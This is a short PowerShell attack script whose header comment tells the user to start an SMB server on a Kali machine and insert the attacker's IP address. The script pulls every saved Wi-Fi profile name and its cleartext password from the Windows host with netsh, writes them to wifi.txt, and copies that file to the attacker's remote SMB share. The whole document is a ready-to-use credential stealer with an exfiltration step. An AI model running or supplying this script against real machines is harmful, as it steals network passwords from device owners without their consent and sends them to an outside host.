<#

BEFORE RUNNING THE SCRIPT START AN SMBSERVER ON YOUR KALI MACHINE WITH smbserver.py share  -smb2support
PUT IN YOUR IP ADDRESS, IF NOT ON THE SAME NETWORK WILL HAVE TO DO PORT FORWARDING
#>

(netsh wlan show profiles) | Select-String “\:(.+)$” | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=”$name” key=clear)} | Select-String “Key Content\W+\:(.+)$” | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} > wifi.txt


cp wifi.txt \\<YOUR IP ADDRESS\share 